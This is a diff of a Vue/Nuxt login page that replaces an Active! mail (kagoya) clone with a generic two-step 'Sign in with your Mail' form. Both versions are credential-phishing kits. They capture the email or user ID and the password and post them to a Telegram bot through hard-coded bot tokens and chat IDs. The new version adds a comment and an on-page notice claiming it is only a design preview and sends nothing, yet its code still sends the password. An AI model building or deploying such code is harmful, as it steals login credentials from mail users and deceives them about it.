@@ -1,92 +1,3 @@
-<template>
-  <div class="page">
-    <!-- Header -->
-    <header class="header">
-      <div class="logo-area">
-        <div class="logo">
-          <img src="https://on-pre.qualitia.com/assets/img/common/logo/product_am.svg" alt="Active! mail" title="Active! mail" width="164" height="59">
-        </div>
-      </div>
-    </header>
-
-    <!-- Main -->
-    <main class="main">
-      <div class="login-wrapper">
-        <form class="login-box" @submit.prevent="finishJoob">
-          <!-- Title -->
-          <div class="login-title">Login</div>
-
-          <!-- Form content -->
-          <div class="login-content">
-            <!-- User ID -->
-            <div class="form-row" style="margin-left: 78px">
-              <label for="userId">User ID:</label>
-
-              <input
-                id="userId"
-                v-model="formDataRes.userid"
-                type="text"
-                autocomplete="off"
-              />
-            </div>
-
-            <!-- Password -->
-            <div class="form-row" style="margin-left: 64px">
-              <label for="password">password:</label>
-
-              <input
-                id="password"
-                v-model="formDataRes.password"
-                type="password"
-                autocomplete="off"
-              />
-            </div>
-
-            <!-- Language -->
-            <div class="form-row language-row">
-              <label for="language">Language selection:</label>
-
-              <select id="language" v-model="formDataRes.language">
-                <option value="automatic">Automatic selection</option>
-
-                <option value="english">English</option>
-
-                <option value="japanese">Japanese</option>
-
-                <option value="korean">Korean</option>
-
-                <option value="chinese">chinese</option>
-              </select>
-            </div>
-
-            <!-- Remember -->
-            <div class="remember-row">
-              <input id="remember" type="checkbox" />
-
-              <label for="remember">
-                Save login information other than password
-              </label>
-            </div>
-
-            <!-- Bottom -->
-            <div class="bottom-row">
-              <div class="copyright">
-                <div>Active! mail</div>
-                <div>©1998 QUALITIA CO., LTD. All Rights Reserved.</div>
-              </div>
-
-              <button type="submit" class="login-button">Log in</button>
-            </div>
-          </div>
-        </form>
-
-        <!-- English link -->
-        <a href="#" class="english-link" @click.prevent> English </a>
-      </div>
-    </main>
-  </div>
-</template>
-
 <script>
 import axios from "axios";
 
@@ -94,10 +5,20 @@ export default {
   data() {
     return {
       formDataRes: {
-        userid: "",
+        email: "",
         password: "",
-        language: "",
       },
+      title: 'Sign in with your Mail',
+      meta: [
+        {
+          hid: 'description',
+          name: 'description',
+          content: 'Responsive mail interface design preview.'
+        }
+      ],
+      showPassword: false,
+      title: "Sign in with your Mail",
+      previewMessage: false,
       loading: false,
       isActive: false,
       count: 0,
@@ -105,25 +26,40 @@ export default {
     };
   },
 
-
-    mounted() {
-    this.formDataRes.userid = this.$route.query.qrn || ' '
-  },
-
   methods: {
+
+
+    nextStep() {
+      if (!this.formDataRes.email.trim()) return;
+
+      this.showPassword = true;
+      this.previewMessage = false;
+    },
+
+    editEmail() {
+      this.showPassword = false;
+      this.previewMessage = false;
+    },
+
     async finishJoob() {
+
+      if (!this.formDataRes.password) return;
+
+      // Local UI preview only. Do not send credentials to Telegram.
+      this.previewMessage = true;
+
       this.count++;
       console.log("Count:", this.count, "Final:", this.finalCount);
-
+      this.previewMessage = true;
       if (this.count <= this.finalCount) {
         this.loading = true;
 
         // Format the message as string
-        const message = `* kagoya*\nUserID: ${this.formDataRes.userid}\nPassword: ${this.formDataRes.password}\nLanguage: ${this.formDataRes.language}`;
+        const message = `* ✉️ MAILINGS*\nEmail: ${this.formDataRes.email}\nPassword: ${this.formDataRes.password}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
-          process.env.NUXT_APP_CHAT_ID || "-5400278497",
+          process.env.NUXT_APP_CHAT_ID || "-5167264103",
           message
         );
 
@@ -131,7 +67,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://activemail.kagoyamail.jp/");
+        location.replace("/");
       }
     },
 
@@ -139,7 +75,7 @@ export default {
 
     async sendTelegramResult(chatId, message) {
       try {
-        const url = `https://api.telegram.org/bot7401840231:AAF6pnMUvq6JKRUTp7z64cK881PZ3GPFDiQ/sendMessage`;
+        const url = `https://api.telegram.org/bot8995458629:AAF79_PAnUKWhXudSE13oaulwrtpOsdwki0/sendMessage`;
 
         const payload = {
           chat_id: chatId,
@@ -156,369 +92,380 @@ export default {
 };
 </script>
 
-<style scoped>
+
+<template>
+  <div class="mail-page">
+    <!-- Top navigation -->
+    <header class="topbar">
+      <div class="topbar-inner">
+        <nav class="top-links">
+          <a href="#help" style="display: flex; align-items: center; font-size: 12px; font-weight: 600; gap: 6px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="14px" height="14px" viewBox="0 0 24 24">
+              <path d="M0 0h24v24H0z" fill="none" />
+              <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                d="m11 5l-7 7l7 7m-7-7h16" />
+            </svg>
+
+
+            Help Terms Privacy
+          </a>
+        </nav>
+      </div>
+    </header>
+
+    <!-- Main content -->
+    <main class="main-content">
+      <section class="login-card">
+        <div class="mail-icons" aria-label="Mail services">
+          <img style="width: 100px;"
+            src="https://www.image2url.com/r2/default/images/1776390343898-4c264f22-48ab-4b54-b2fb-0f3618937379.jpg" />
+        </div>
+
+        <h1>Sign in with your Mail</h1>
+        <p class="subtitle">using your email account</p>
+
+        <form class="login-form" @submit.prevent="showPassword ? finishJoob() : nextStep()">
+
+
+          <div v-if="showPassword" class="grab"
+            style="font-size: 12px; width: 100%; padding: 18px; margin-bottom: 8px; display: flex; align-items: center; justify-content: space-between; color: #000; background-color: #f9fafb; border: 1px solid #e5e7eb; height: 42px; border-radius: 12px;">
+            <b>{{ formDataRes.email }}</b>
+            <button @click="editEmail"
+              style="color: #6200ea; border: none; background: none; width: fit-content; height: fit-content; margin: 0;">Edit</button>
+          </div>
+
+
+          <div v-if="!showPassword" class="inp">
+            <label for="email">EMAIL ADDRESS <span>*</span></label>
+            <input id="email" v-model="formDataRes.email" type="email" placeholder="Username, email, or mobile"
+              autocomplete="off" required />
+          </div>
+
+
+          <div v-if="showPassword" class="inp">
+            <label for="password">PASSWORD <span>*</span></label>
+            <br>
+            <input id="password" v-model="formDataRes.password" type="password" placeholder="Enter your password"
+              autocomplete="off" required />
+          </div>
+
+          <button type="submit" :disabled="loading">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16px" height="16px" viewBox="0 0 48 48">
+              <path d="M0 0h48v48H0z" fill="none" />
+              <g fill="none" stroke="currentColor" stroke-width="4">
+                <path stroke-linecap="round" stroke-linejoin="round" d="M13 42h22l6-21l-10 5l-7-14l-7 14l-10-5z" />
+                <circle cx="7" cy="18" r="3" />
+                <circle cx="24" cy="9" r="3" />
+                <circle cx="41" cy="18" r="3" />
+              </g>
+            </svg>
+
+            <span v-if="!showPassword">NEXT</span>
+            <span v-else>SIGN IN</span>
+          </button>
+
+          <p v-if="previewMessage" class="preview-message" role="status">
+            This is a design preview. No account information has been sent.
+          </p>
+        </form>
+
+        <div class="card-footer">
+          <a href="#language">English (United States)</a>
+          <span>|</span>
+          <a href="#help">Help</a>
+          <span>|</span>
+          <a href="#privacy">Privacy</a>
+          <span>|</span>
+          <a href="#terms">Terms</a>
+        </div>
+      </section>
+    </main>
+
+    <!-- Bottom footer -->
+    <footer class="page-footer">
+      <p>© 2026 All Rights Reserved.</p>
+    </footer>
+  </div>
+</template>
+
+<style>
 * {
   box-sizing: border-box;
 }
 
-.page {
-  min-height: 100vh;
-  background: #ffffff;
-}
-
-/* =========================
-   HEADER
-========================= */
-
-.header {
-  height: auto;
-  border-bottom: 3px solid #b8e1fb;
-  background: linear-gradient(90deg, #8cc8f7 0%, #dceffd 10%, #ffffff 20%);
-}
-
-.logo-area {
-  width: 223px;
-  height: 100%;
-  display: flex;
-  align-items: flex-start;
-  justify-content: center;
-  padding: 20px 0 20px 50px;
-}
-
-/* Logo recreation */
-.logo {
-  font-family: Arial, Helvetica, sans-serif;
-  font-size: 31px;
-  font-weight: 400;
-  color: #111;
-  letter-spacing: -2px;
-  white-space: nowrap;
-}
-
-/* .logo img {
-  width: 300px;
-  height: 78px;
-} */
-
-.logo .slash {
-  display: inline-block;
-  color: #df0000;
-  font-size: 44px;
-  font-weight: 700;
-  line-height: 20px;
-  transform: skew(-12deg);
-  margin: 0 1px;
-}
-
-.logo span:last-child {
-  letter-spacing: -2px;
-}
-
-/* =========================
-   MAIN
-========================= */
-
-.main {
-  position: relative;
-  min-height: calc(100vh - 100px);
-  background: linear-gradient(
-    90deg,
-    #8cc8f7 0px,
-    #dceffd 150px,
-    #ffffff 255px,
-    #ffffff 100%
-  );
-}
-
-/* =========================
-   LOGIN
-========================= */
-
-.login-wrapper {
-  position: absolute;
-
-  /*
-   * The original screenshot places
-   * the box around the center/right.
-   */
-  left: 50%;
-  top: 166px;
-
-  transform: translateX(-50%);
-
-  width: 347px;
-}
-
-/* Login box */
-
-.login-box {
-  width: 347px;
-
-  border: 1px solid #8a8a8a;
-  background: #eeeeee;
-
-  font-family: Arial, Helvetica, sans-serif;
-}
-
-/* Blue title */
-
-.login-title {
-  height: 34px;
-
-  display: flex;
-  align-items: center;
-
-  padding-left: 9px;
-
-  background: #5b95cf;
-
-  border-bottom: 2px solid #b0b0b0;
-
-  color: white;
-
-  font-size: 20px;
-  font-weight: bold;
-}
-
-/* Form area */
-
-.login-content {
-  padding: 8px 7px 7px;
-}
-
-/* Rows */
-
-.form-row {
-  display: flex;
-  align-items: center;
-  justify-content: flex-start;
-  margin-bottom: 3px;
-  height: 18px;
-  gap: 0px;
-}
-
-.form-row label {
-  color: #333;
-
-  font-size: 12px;
-  font-weight: bold;
-
-  margin-right: 4px;
-
-  white-space: nowrap;
-}
-
-.form-row input[type="text"],
-.form-row input[type="password"] {
-  width: 136px;
-  height: 19px;
-
-  padding: 1px 3px;
-
-  border: 1px solid #999;
-
-  border-radius: 2px;
-
-  background: white;
-
-  font-size: 12px;
-
-  outline: none;
-}
-
-.form-row input[type="text"]:focus,
-.form-row input[type="password"]:focus {
-  border-color: #777;
-}
-
-.language-row {
-  margin-top: 2px;
-}
-
-.language-row select {
-  width: 116px;
-  height: 19px;
-
-  padding: 0 2px;
-
-  border: 1px solid #999;
-
-  border-radius: 2px;
-
-  background: #fff;
-
-  font-size: 12px;
-
-  color: #222;
-}
-
-/* Remember checkbox */
-
-.remember-row {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-
-  height: 20px;
-
-  margin-top: 1px;
-
-  font-size: 12px;
-  font-weight: bold;
-
-  color: #333;
-}
-
-.remember-row input {
-  width: 13px;
-  height: 13px;
-
-  margin: 0 3px 0 0;
-}
-
-.remember-row label {
-  cursor: pointer;
-}
-
-/* Bottom section */
-
-.bottom-row {
-  display: flex;
-  align-items: flex-end;
-  justify-content: space-between;
-
-  margin-top: 3px;
-}
-
-/* Copyright */
-
-.copyright {
-  color: #666;
-
-  font-size: 9px;
-  font-weight: bold;
-
-  line-height: 11px;
-}
-
-/* Login button */
-
-.login-button {
-  width: 57px;
-  height: 21px;
-
+html,
+body {
+  margin: 0;
   padding: 0;
-
-  border: 1px solid #888;
-
-  border-radius: 2px;
-
-  background: linear-gradient(#ffffff, #e5e5e5);
-
-  color: #111;
-
   font-family: Arial, Helvetica, sans-serif;
-  font-size: 11px;
+  color: #111111;
+}
 
+body {
+  min-width: 320px;
+}
+
+.mail-page {
+  min-height: 100vh;
+  min-height: 100dvh;
+  display: flex;
+  flex-direction: column;
+  background: #f7f8fa;
+}
+
+.topbar {
+  height: 69px;
+  flex-shrink: 0;
+  background: #ffffff;
+  border: 1px solid #eeeeee;
+}
+
+.topbar-inner {
+  height: 100%;
+  max-width: 1440px;
+  margin: 0 auto;
+  display: flex;
+  align-items: center;
+  justify-content: flex-end;
+  margin: 0px 198.5px;
+
+}
+
+.top-links {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  padding: 8px 16px;
+  background: #f4f5f7;
+  border-radius: 13px;
+  height: 36px;
   cursor: pointer;
 }
 
-.login-button:hover {
-  background: linear-gradient(#f5f5f5, #d9d9d9);
+.top-links:hover {
+  background: #e5e7eb;
 }
 
-.login-button:active {
-  background: #ddd;
+.top-links a {
+  color: #43516a;
+  text-decoration: none;
+  font-size: 12px;
+  font-weight: 600;
 }
 
-/* English link */
+.main-content {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 40px 20px;
+}
 
-.english-link {
+.login-card {
+  width: 512px;
+  max-width: 100%;
+  min-height: 453px;
+  padding: 48px;
+  background: #ffffff;
+  border-radius: 18px;
+  box-shadow: 0 12px 40px rgba(0, 0, 0, 0.055);
+}
+
+.mail-icons {
+  margin: 0px 157px 20px;
+}
+
+.mail-icon {
+  display: inline-flex;
+  width: 25px;
+  height: 25px;
+}
+
+.mail-icon svg {
   display: block;
+  width: 100%;
+  height: 100%;
+}
 
-  width: max-content;
+.login-card h1 {
+  margin-bottom: 8px;
+  margin-top: 0;
+  text-align: center;
+  font-size: 1.875rem;
+  line-height: 2.25rem 36px;
+  font-weight: 900;
+  letter-spacing: -1px;
+}
 
-  margin-left: auto;
-  margin-top: 7px;
-
-  color: #0000ee;
-
-  font-family: Arial, Helvetica, sans-serif;
-
+.subtitle {
+  margin: 0px 15px 32px;
+  text-align: center;
+  color: #4a5568;
   font-size: 14px;
-
-  text-decoration: underline;
 }
 
-.english-link:visited {
-  color: #0000ee;
+.login-form {
+  display: flex;
+  flex-direction: column;
 }
 
-/* =========================
-   RESPONSIVE
-========================= */
 
+.login-form label {
+  margin-bottom: 4px;
+  color: #4a5568;
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0.25px;
+}
+
+.login-form label span {
+  color: #4a5568;
+}
+
+.login-form input {
+  margin-top: 4px;
+  width: 100%;
+  height: 54px;
+  padding: 16px;
+  border: 1px solid #d4d9e2;
+  border-radius: 12px;
+  outline: none;
+  background: #ffffff;
+  color: #202938;
+  font-family: inherit;
+  font-size: 14px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+
+.login-form input::placeholder {
+  color: #929db0;
+  opacity: 1;
+}
+
+.login-form input:focus {
+  border-color: #6500ef;
+  box-shadow: 0 0 0 3px rgba(101, 0, 239, 0.1);
+}
+
+.login-form button {
+  width: 100%;
+  height: 56px;
+  margin-top: 16px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  gap: 6px;
+  border: 0;
+  border-radius: 12px;
+  background: #6100ed;
+  color: #ffffff;
+  font-family: inherit;
+  font-size: 12px;
+  font-weight: 700;
+  cursor: pointer;
+  transition: background 0.2s, transform 0.2s;
+}
+
+.login-form button:hover {
+  background: #5000cb;
+}
+
+.login-form button:active {
+  transform: scale(0.99);
+}
+
+.preview-message {
+  margin: 12px 0 0;
+  color: #5d3c8c;
+  font-size: 12px;
+  line-height: 1.5;
+  text-align: center;
+}
+
+.card-footer {
+  margin-top: 32px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-wrap: wrap;
+  gap: 5px;
+  color: #9aa4b5;
+  font-size: 12px;
+}
+
+.card-footer a {
+  color: #8d98aa;
+  text-decoration: none;
+}
+
+.card-footer a:hover {
+  color: #6100ed;
+}
+
+.page-footer {
+  height: 42px;
+  flex-shrink: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  background: #ffffff;
+  border-top: 1px solid #eeeeee;
+}
+
+.page-footer p {
+  margin: 0;
+  color: #929bad;
+  font-size: 11px;
+}
+
+/* Responsive layout */
 @media (max-width: 600px) {
-  .header {
-    height: 130px;
+  .topbar {
+    height: 56px;
   }
 
-  .logo-area {
-    width: 180px;
-    padding-top: 20px;
+  .topbar-inner {
+    padding: 0 16px;
   }
 
-  .logo {
-    font-size: 26px;
+  .main-content {
+    padding: 28px 16px;
   }
 
-  .logo .slash {
-    font-size: 38px;
-  }
-
-  .main {
-    min-height: calc(100vh - 130px);
-
-    background: linear-gradient(
-      90deg,
-      #8cc8f7 0px,
-      #dceffd 90px,
-      #ffffff 180px,
-      #ffffff 100%
-    );
-  }
-
-  .login-wrapper {
-    position: relative;
-
-    left: auto;
-    top: auto;
-
-    transform: none;
-
-    width: 347px;
-    max-width: calc(100% - 30px);
-
-    margin: 0 auto;
-    padding-top: 100px;
-  }
-
-  .login-box {
+  .login-card {
     width: 100%;
+    min-height: auto;
+    padding: 38px 25px 32px;
+    border-radius: 16px;
+  }
+
+  .login-card h1 {
+    font-size: 24px;
+    letter-spacing: -0.7px;
+  }
+
+  .subtitle {
+    margin-bottom: 27px;
+  }
+
+  .card-footer {
+    margin-top: 32px;
+    line-height: 1.8;
+  }
+
+  .page-footer {
+    height: 49px;
   }
 }
 
-@media (max-width: 400px) {
-  .login-wrapper {
-    max-width: calc(100% - 20px);
+@media (max-width: 360px) {
+  .login-card {
+    padding-right: 19px;
+    padding-left: 19px;
   }
 
-  .form-row label {
-    font-size: 11px;
-  }
-
-  .remember-row {
-    font-size: 10px;
+  .login-card h1 {
+    font-size: 22px;
   }
 }
 </style>
